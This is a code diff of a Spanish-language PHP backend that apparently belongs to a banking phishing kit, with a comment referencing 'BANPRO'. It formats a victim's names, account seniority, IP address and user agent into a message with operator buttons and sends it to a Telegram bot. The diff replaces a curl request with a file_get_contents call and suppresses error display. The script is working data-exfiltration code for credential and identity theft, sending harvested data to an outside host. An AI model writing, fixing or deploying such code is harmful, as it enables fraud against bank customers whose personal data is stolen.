@@ -1,4 +1,6 @@
 <?php
+ini_set('display_errors', 0);
+error_reporting(E_ALL);
 session_start();
 header('Content-Type: application/json; charset=UTF-8');
 
@@ -38,7 +40,7 @@ $msg .= "🏛️ <b>Antigüedad:</b> " . htmlspecialchars($antiguedad) . "\n";
 $msg .= "━━━━━━━━━━━━━━━━━━━━\n";
 $msg .= "🌐 <b>IP:</b> {$ip}\n";
 $msg .= "🕒 <b>Fecha:</b> {$date}\n";
-$msg .= "📲 <b>UA:</b> " . mb_substr($ua, 0, 80) . "\n";
+$msg .= "📲 <b>UA:</b> " . substr($ua, 0, 80) . "\n";
 
 // Identificador para los botones
 $uid = $nombres . ' ' . $apellidos;
@@ -62,27 +64,11 @@ $keyboard = json_encode([
     ]
 ]);
 
-// Enviar a Telegram
-$url = 'https://api.telegram.org/bot' . $token . '/sendMessage';
-$ch  = curl_init($url);
-curl_setopt_array($ch, [
-    CURLOPT_POST           => true,
-    CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_TIMEOUT        => 10,
-    CURLOPT_POSTFIELDS     => [
-        'chat_id'      => $chat_id,
-        'text'         => $msg,
-        'parse_mode'   => 'HTML',
-        'reply_markup' => $keyboard,
-    ],
-]);
-$resp   = curl_exec($ch);
-$err    = curl_error($ch);
-curl_close($ch);
-
-if ($err) {
-    echo json_encode(['ok' => false, 'error' => $err]);
-    exit;
-}
+// Enviar a Telegram (igual que BANPRO-token2)
+file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
+    'chat_id'      => $chat_id,
+    'text'         => $msg,
+    'reply_markup' => $keyboard,
+]));
 
 echo json_encode(['ok' => true]);
